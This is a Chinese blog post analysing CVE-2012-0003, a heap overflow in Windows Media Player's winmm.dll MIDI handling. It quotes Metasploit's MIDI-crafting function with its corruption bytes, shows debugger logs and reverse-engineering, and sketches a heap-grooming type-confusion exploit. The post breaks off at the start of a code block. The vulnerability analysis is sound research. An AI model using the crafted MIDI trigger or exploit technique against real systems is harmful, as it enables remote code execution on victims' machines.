<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>CVE-2012-0003 Windows Media Player 漏洞分析 - B1TG</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<meta name="author" content="b1tg" /><meta name="description" content="CVE-2012-0003 Microsoft Windows Media Player heap overflow" /><meta name="keywords" content="Hugo, b1tg, even" />






<meta name="generator" content="Hugo 0.109.0 with theme even" />


<link rel="canonical" href="https://b1tg.github.io/post/cve-2012-0003-microsoft-windows-media-player-heap-overflow/" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">



<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">


<meta property="og:title" content="CVE-2012-0003 Windows Media Player 漏洞分析" />
<meta property="og:description" content="CVE-2012-0003 Microsoft Windows Media Player heap overflow" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://b1tg.github.io/post/cve-2012-0003-microsoft-windows-media-player-heap-overflow/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2020-01-10T00:39:50+08:00" />
<meta property="article:modified_time" content="2020-01-10T00:39:50+08:00" />
<meta itemprop="name" content="CVE-2012-0003 Windows Media Player 漏洞分析">
<meta itemprop="description" content="CVE-2012-0003 Microsoft Windows Media Player heap overflow"><meta itemprop="datePublished" content="2020-01-10T00:39:50+08:00" />
<meta itemprop="dateModified" content="2020-01-10T00:39:50+08:00" />
<meta itemprop="wordCount" content="2667">
<meta itemprop="keywords" content="漏洞分析," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2012-0003 Windows Media Player 漏洞分析"/>
<meta name="twitter:description" content="CVE-2012-0003 Microsoft Windows Media Player heap overflow"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">B1TG</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="/notes/">
        <li class="mobile-menu-item">Notes</li>
      </a><a href="/about">
        <li class="mobile-menu-item">About</li>
      </a><a href="/quotes">
        <li class="mobile-menu-item">Quotes</li>
      </a>
  </ul>

  


</nav>

  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="/" class="logo">B1TG</a>
</div>





<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/notes/">Notes</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/about">About</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/quotes">Quotes</a>
      </li>
  </ul>
</nav>

    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">CVE-2012-0003 Windows Media Player 漏洞分析</h1>

      <div class="post-meta">
        <span class="post-time"> 2020-01-10 </span>
        
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">文章目录</h2>
  <div class="post-toc-content always-active">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#环境">环境</a></li>
    <li><a href="#分析">分析</a>
      <ul>
        <li><a href="#样本文件">样本文件</a></li>
        <li><a href="#漏洞触发">漏洞触发</a></li>
        <li><a href="#溯源">溯源</a></li>
        <li><a href="#利用">利用</a></li>
      </ul>
    </li>
    <li><a href="#总结">总结</a></li>
    <li><a href="#参考">参考</a></li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <h2 id="环境">环境</h2>
<ul>
<li>Windows XP</li>
<li>Windows Media Player (10.00.00.3802)</li>
<li>Internet Explorer</li>
<li>Immunity Debugger</li>
<li>IDA</li>
<li>ubuntu 16.04 with metasploit</li>
</ul>
<h2 id="分析">分析</h2>
<p>winmm.dll在处理网页中嵌入的midi文件时产生了堆溢出。</p>
<h3 id="样本文件">样本文件</h3>
<p>在msf中搜索“cve-2012-0003”找到模块<code>windows/browser/ms12_004_midi</code>，选好payload和option之后，运行exploit会启动一个web server，并打印出访问地址，在xp中访问这个链接发现可以触发漏洞，为了便于调试还是生成本地文件方便一点，直接用curl把网页保存成html，打开发现还加载了midi文件，按照链接也curl下来就好，记得把html中的midi路径换成相对路径。</p>
<p>在010editor中打开midi文件：</p>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200108223715435.png" alt="image-20200108223715435"></p>
<p>msf的这个模块对应的文件为<code>ms12_004_midi.rb</code>，查看代码发现生成midi文件的部分如下，这里就不分析文件格式了，后面有疑问的时候回来对照着图片和代码看就好。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">get_midi</span><span class="p">(</span><span class="n">stage</span><span class="o">=</span><span class="s2">&#34;corruption&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># MIDI Fileformat Reference:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># http://www.sonicspot.com/guide/midifiles.html</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Event Types:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 0x08 = Note Off (when MIDI key is released)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 0x09 = Note On (when MIDI key is pressed)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 0x0A = Note aftertouch (pressure change on the pressed MIDI key)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 0x0B = Controller Event (MIDI channels state)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 0x0C = Program change (Which instrument/patch should be played on the MIDI channel)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 0x0D = Channel aftertouch (similar to Note Aftertouch; effects all keys pressed on the specific MIDI channel)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 0x0E = Pitch Bend (similiar to a controller event; has 2 bytes to describe its value)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 0x0F = Meta Events (not sent or received over a midi port)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Structure:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># [Header Chunk][Track Chunk][Meta Event][Meta Event][SYSEX Event][Midi Channel Event)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Track Chunk Data</span>
</span></span><span class="line"><span class="cl">    <span class="n">tc</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x00\xFF\x03\x0D\x44\x72\x75\x6D</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Meta Event - Sequence/Track Name</span>
</span></span><span class="line"><span class="cl">    <span class="n">tc</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x73\x20\x20\x20\x28\x42\x42\x29\x00</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Midi Channel Event - Program Change</span>
</span></span><span class="line"><span class="cl">    <span class="n">tc</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x00\xC9\x28</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Midi Channel Event - Controller</span>
</span></span><span class="line"><span class="cl">    <span class="n">tc</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x00\xB9\x07\x64</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Midi Channel Event - Controller</span>
</span></span><span class="line"><span class="cl">    <span class="n">tc</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x00\xB9\x0A\x40</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Midi Channel Event - Controller</span>
</span></span><span class="line"><span class="cl">    <span class="n">tc</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x00\xB9\x7B\x00</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Midi Channel Event - Controller</span>
</span></span><span class="line"><span class="cl">    <span class="n">tc</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x00\xB9\x5B\x28</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Midi Channel Event - Controller</span>
</span></span><span class="line"><span class="cl">    <span class="n">tc</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x00\xB9\x5D\x00</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Midi Channel Event - Note On</span>
</span></span><span class="line"><span class="cl">    <span class="n">tc</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x85\x50\x99\x23\x7F</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Corruption events</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">stage</span> <span class="o">==</span> <span class="s2">&#34;corruption&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c1"># Midi Channel Event - Note On</span>
</span></span><span class="line"><span class="cl">      <span class="n">tc</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x00\x9F\xb2\x73</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="c1"># Midi Channel Event - Note Off (trigger a leak)</span>
</span></span><span class="line"><span class="cl">      <span class="n">tc</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x00\x8F\xb2\x73</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Meta Event - End Of Track</span>
</span></span><span class="line"><span class="cl">    <span class="n">tc</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x00\xFF\x2F\x00</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># HEADERCHUNK Header</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;MThd&#34;</span>                 <span class="c1"># Header</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x00\x00\x00\x06</span><span class="s2">&#34;</span>     <span class="c1"># Chunk size</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x00\x00</span><span class="s2">&#34;</span>             <span class="c1"># Format Type</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x00\x01</span><span class="s2">&#34;</span>             <span class="c1"># Number of tracks</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\x00\x60</span><span class="s2">&#34;</span>             <span class="c1"># Time division</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># TRACKCHUNK header</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;MTrk&#34;</span>                 <span class="c1"># Header</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">tc</span><span class="o">.</span><span class="n">length</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;N&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">&lt;&lt;</span> <span class="n">tc</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">#midi_name = &#34;test_case.mid&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">midi_name</span> <span class="o">=</span> <span class="n">rand_text_alpha</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;.mid&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">midi_name</span><span class="p">,</span> <span class="n">m</span>
</span></span><span class="line"><span class="cl">  <span class="k">end</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="漏洞触发">漏洞触发</h3>
<p>由于是堆溢出漏洞，先打开堆页让程序直接crash。</p>
<p><code>gflags.exe -i IExplore.exe +hpa</code></p>
<p>之后打开ie用immunity debugger attach上，拖入poc.html，在ie中有安全警告，点击运行，之后程序会crash掉。</p>
<p>断在这一句，访问到了异常地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">76</span><span class="nf">B2D224</span>  <span class="no">MOV</span> <span class="no">AL</span><span class="p">,</span><span class="no">BYTE</span> <span class="no">PTR</span> <span class="no">DS</span><span class="p">:[</span><span class="no">ESI</span><span class="p">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/Image.png" alt="Image"></p>
<h3 id="溯源">溯源</h3>
<p>下面分析esi的来源，通过mona找到这行代码所在模块winmm.dll，拖入ida中分析，函数有点长，在ida中f5反编译先看看，找到之前crash的语句，那么接下来就要追一下v24是哪里来的。</p>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200108225648722.png" alt="image-20200108225648722"></p>
<p>这里涉及十几个变量，看着头晕，拿笔画一画就清晰多了。</p>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/mmexport1578496347804.jpg" alt="mmexport1578496347804"></p>
<p>呃，貌似还是不太明了他们都是干什么的。接下来使用调试器的“断点记录shift+f4 ”功能把变量都标记一下，调试器会记录下他们值的变化情况。</p>
<p>在ida中对着伪代码和汇编代码，找到感兴趣变量对应的汇编语句，shift+f4打开条件断点窗口设置，之后运行完打开log就可以看到这些变量的变化过程。</p>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200108231931485.png" alt="image-20200108231931485"></p>
<p>我的方法是先在ida中一次性找完，记下来，之后到immunity debugger中依次设好。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">v1  76B2D044 edi
</span></span><span class="line"><span class="cl">v2 76B2D053 esi
</span></span><span class="line"><span class="cl">v9 76B2D099 ebx
</span></span><span class="line"><span class="cl">wParama 76B2D083 ecx
</span></span><span class="line"><span class="cl">v11 76B2D0B8 ecx 
</span></span><span class="line"><span class="cl">v13  76B2D0C9 ecx
</span></span><span class="line"><span class="cl">wParam3a  76B2D20D  edx 
</span></span><span class="line"><span class="cl">v21
</span></span><span class="line"><span class="cl">v23 76B2D214  eax
</span></span><span class="line"><span class="cl">v20 76B2D1BF  esi
</span></span><span class="line"><span class="cl">v24 76B2D224  esi
</span></span></code></pre></td></tr></table>
</div>
</div><p>设完之后的样子：</p>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109002528448.png" alt="image-20200109002528448"></p>
<p>拖入样本运行后打出的log：</p>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109002507947.png" alt="image-20200109002507947"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">76B2D044   COND: v1 = 02A9CE70
</span></span><span class="line"><span class="cl">76B2D053   COND: v2 = 02AC87F8
</span></span><span class="line"><span class="cl">76B2D083   COND: wParama = 18A90088
</span></span><span class="line"><span class="cl">76B2D099   COND: v9 = 00000004
</span></span><span class="line"><span class="cl">76B2D0B8   COND: v11 = 000028C9
</span></span><span class="line"><span class="cl">76B2D0C9   COND: v13 = 000028C9
</span></span><span class="line"><span class="cl">76B2D1BF   COND: v20 = 02ACB380
</span></span><span class="line"><span class="cl">76B2D053   COND: v2 = 02AC87F8
</span></span><span class="line"><span class="cl">76B2D083   COND: wParama = 18A90088
</span></span><span class="line"><span class="cl">76B2D099   COND: v9 = 00000010
</span></span><span class="line"><span class="cl">76B2D0B8   COND: v11 = 006407B9
</span></span><span class="line"><span class="cl">76B2D0C9   COND: v13 = 006407B9
</span></span><span class="line"><span class="cl">76B2D1BF   COND: v20 = 02ACB380
</span></span><span class="line"><span class="cl">76B2D053   COND: v2 = 02AC87F8
</span></span><span class="line"><span class="cl">76B2D083   COND: wParama = 18A90088
</span></span><span class="line"><span class="cl">76B2D099   COND: v9 = 0000001C
</span></span><span class="line"><span class="cl">76B2D0B8   COND: v11 = 00400AB9
</span></span><span class="line"><span class="cl">76B2D0C9   COND: v13 = 00400AB9
</span></span><span class="line"><span class="cl">76B2D1BF   COND: v20 = 02ACB380
</span></span><span class="line"><span class="cl">76B2D053   COND: v2 = 02AC87F8
</span></span><span class="line"><span class="cl">76B2D083   COND: wParama = 18A90088
</span></span><span class="line"><span class="cl">76B2D099   COND: v9 = 00000028
</span></span><span class="line"><span class="cl">76B2D0B8   COND: v11 = 00007BB9
</span></span><span class="line"><span class="cl">76B2D0C9   COND: v13 = 00007BB9
</span></span><span class="line"><span class="cl">76B2D1BF   COND: v20 = 02ACB380
</span></span><span class="line"><span class="cl">76B2D053   COND: v2 = 02AC87F8
</span></span><span class="line"><span class="cl">76B2D083   COND: wParama = 18A90088
</span></span><span class="line"><span class="cl">76B2D099   COND: v9 = 00000034
</span></span><span class="line"><span class="cl">76B2D0B8   COND: v11 = 00285BB9
</span></span><span class="line"><span class="cl">76B2D0C9   COND: v13 = 00285BB9
</span></span><span class="line"><span class="cl">76B2D1BF   COND: v20 = 02ACB380
</span></span><span class="line"><span class="cl">76B2D053   COND: v2 = 02AC87F8
</span></span><span class="line"><span class="cl">76B2D083   COND: wParama = 18A90088
</span></span><span class="line"><span class="cl">76B2D099   COND: v9 = 00000040
</span></span><span class="line"><span class="cl">76B2D0B8   COND: v11 = 00005DB9
</span></span><span class="line"><span class="cl">76B2D0C9   COND: v13 = 00005DB9
</span></span><span class="line"><span class="cl">76B2D1BF   COND: v20 = 02ACB380
</span></span><span class="line"><span class="cl">76B2D053   COND: v2 = 02A9CF18
</span></span><span class="line"><span class="cl">76B2D083   COND: wParama = 028E91C8
</span></span><span class="line"><span class="cl">7C8106E9   New thread with ID 000002A0 created
</span></span><span class="line"><span class="cl">192E0000   Modules C:\WINDOWS\system32\wmvcore.dll
</span></span><span class="line"><span class="cl">73620000   Modules C:\WINDOWS\system32\msdmo.dll
</span></span><span class="line"><span class="cl">7C8106E9   New thread with ID 000001D8 created
</span></span><span class="line"><span class="cl">19530000   Modules C:\WINDOWS\system32\WMASF.DLL
</span></span><span class="line"><span class="cl">76B2D044   COND: v1 = 02A9CE70
</span></span><span class="line"><span class="cl">76B2D053   COND: v2 = 02A9CF18
</span></span><span class="line"><span class="cl">76B2D083   COND: wParama = 028E91C8
</span></span><span class="line"><span class="cl">76B2D099   COND: v9 = 00000004
</span></span><span class="line"><span class="cl">76B2D0B8   COND: v11 = 007F2399
</span></span><span class="line"><span class="cl">76B2D0C9   COND: v13 = 007F2399
</span></span><span class="line"><span class="cl">76B2D1BF   COND: v20 = 02ACB380
</span></span><span class="line"><span class="cl">76B2D20D   COND: wParam3a = 00000023
</span></span><span class="line"><span class="cl">76B2D214   COND: v23 = 00000251
</span></span><span class="line"><span class="cl">76B2D224   COND: v24 = 02ACB5D1
</span></span><span class="line"><span class="cl">76B2D053   COND: v2 = 02A9CF18
</span></span><span class="line"><span class="cl">76B2D083   COND: wParama = 028E91C8
</span></span><span class="line"><span class="cl">76B2D099   COND: v9 = 00000010
</span></span><span class="line"><span class="cl">76B2D0B8   COND: v11 = 0073B29F
</span></span><span class="line"><span class="cl">76B2D0C9   COND: v13 = 0073B29F
</span></span><span class="line"><span class="cl">76B2D1BF   COND: v20 = 02ACB380
</span></span><span class="line"><span class="cl">76B2D20D   COND: wParam3a = 000000B2
</span></span><span class="line"><span class="cl">76B2D214   COND: v23 = 00000419
</span></span><span class="line"><span class="cl">76B2D224   COND: v24 = 02ACB799
</span></span><span class="line"><span class="cl">           [00:14:21] Thread 000007C0 terminated, exit code 0
</span></span></code></pre></td></tr></table>
</div>
</div><p>分析发现：</p>
<ul>
<li>v20 = 02ACB380从头到尾都是不变的，而这个值来源于此函数的唯一参数</li>
<li>v11==v13，每次值会有变化</li>
<li>v9是递增的</li>
<li>wParam3a是截取v11的8到15位</li>
</ul>
<p>v23是通过wParam3a和v21计算出来的(v21的值和v11一样，上面忘打了)，试了一下，果然是这样。</p>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109003859906.png" alt="image-20200109003859906"></p>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109004219848.png" alt="image-20200109004219848"></p>
<p>现在看来v23来源于v11，v11从哪里来的呢，样本。</p>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109005127185.png" alt="image-20200109005127185"></p>
<p>最后导致程序crash的地址是v23+v20，现在还剩v20了，前面说v20来自函数参数，那么就xref看看</p>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109005340654.png" alt="image-20200109005340654"></p>
<p>对gpEmuList进行xref找到写它的地方，发现他指向一块分配的堆：</p>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109005536301.png" alt="image-20200109005536301"></p>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109005757979.png" alt="image-20200109005757979"></p>
<p>所以，v20是基地址，v23是索引，v23=0x419时发生了越界读取，程序crash。</p>
<h3 id="利用">利用</h3>
<p>在越界访问发生之后，程序会对esi指向的内存进行+1操作，exp中利用这一点来造成类型混淆。</p>
<p><img src="/img/CVE-2012-0003-Microsoft-Windows-Media-Player-heap-overflow/image-20200109102702172.png" alt="image-20200109102702172"></p>
<p>大致思路是在内存中连续分配内存，间隔释放留下一些“空洞”，期待winmmAlloc会申请到这片区域（插空），之后触发漏洞会改写下一个块的数据（+1），控制这个写入的偏移，即可造成下一个块的类型混淆。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
